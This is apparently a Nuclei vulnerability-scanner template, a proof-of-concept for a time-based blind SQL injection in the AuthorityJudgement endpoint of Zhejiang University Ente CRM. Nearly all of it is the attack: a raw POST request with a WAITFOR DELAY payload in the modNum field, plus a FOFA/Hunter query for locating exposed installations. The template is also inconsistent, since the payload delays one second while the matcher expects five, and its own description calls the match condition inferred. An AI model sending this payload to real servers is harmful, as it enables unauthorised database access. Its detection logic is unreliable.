id: poc-bd0fb4ced55d1128b240
info:
  name: 浙大恩特CRMAuthorityJudgement存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bd0fb4ced55d1128b2400be1c218d7f2

    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: bd0fb4ced55d1128b2400be1c218d7f2
    fofa: + hunter`app.name="浙大恩特 CRM"`
http:
- raw:
  - 'POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

    Content-Length: 34

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close

    Content-Type: application/x-www-form-urlencoded


    modNum=1'';WAITFOR DELAY ''0:0:1''--+'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
